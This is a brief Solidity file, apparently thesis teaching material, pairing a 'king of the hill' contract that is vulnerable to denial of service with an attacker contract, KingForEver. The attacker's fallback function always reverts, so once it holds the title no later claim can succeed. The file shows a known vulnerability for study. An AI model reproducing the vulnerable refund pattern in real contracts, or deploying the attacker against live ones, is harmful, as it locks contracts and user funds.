// own work
pragma solidity ^0.4.23;

contract KingOfTheBachelorThesis {
    struct King {
        string name;
        address refundAddress;
        uint value;
    }
    
    King public current = King({
        name: "Nobody",
        refundAddress: msg.sender,
        value: 1 ether
    });   

    function claim(string _name) public payable {
        require(msg.value > current.value);
        current.refundAddress.transfer(address(this).balance);
        
        current = King({
            name: _name,
            refundAddress: msg.sender,
            value: msg.value
        });
    }
}

contract KingForEver {
    function () public payable {
        revert();
    }
    
    function attack(KingOfTheBachelorThesis kotbt) public payable {
        kotbt.claim.value(address(this).balance)("Forever King!!!");
    }
}
